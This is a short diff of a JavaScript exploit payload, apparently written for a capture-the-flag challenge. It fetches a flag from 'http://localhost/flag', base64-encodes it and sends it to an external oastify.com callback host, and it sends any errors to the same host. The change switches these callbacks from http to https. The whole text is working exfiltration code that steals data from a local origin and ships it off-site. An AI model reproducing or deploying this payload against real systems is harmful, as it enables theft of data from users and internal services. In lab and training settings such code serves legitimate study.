@@ -9,15 +9,15 @@ setTimeout(() => {
     fetch('http://localhost/flag')
         .then(r => r.text())
         .then(flag => {
-            // Submit successful response
-            fetch('http://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?flag=' + btoa(flag))
+            // Use HTTPS for the callback
+            fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?flag=' + btoa(flag))
                 .then(() => {
-                    document.body.innerHTML = '<h1>Flag submitted successfully!</h1>';
+                    document.body.innerHTML = '<h1>Flag submitted!</h1>';
                 });
         })
         .catch(err => {
-            // Submit error response
-            fetch('http://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error=' + btoa(err.toString()))
+            // Use HTTPS for the callback
+            fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error=' + btoa(err.toString()))
                 .then(() => {
                     document.body.innerHTML = '<h1>Error submitted!</h1>';
                 });
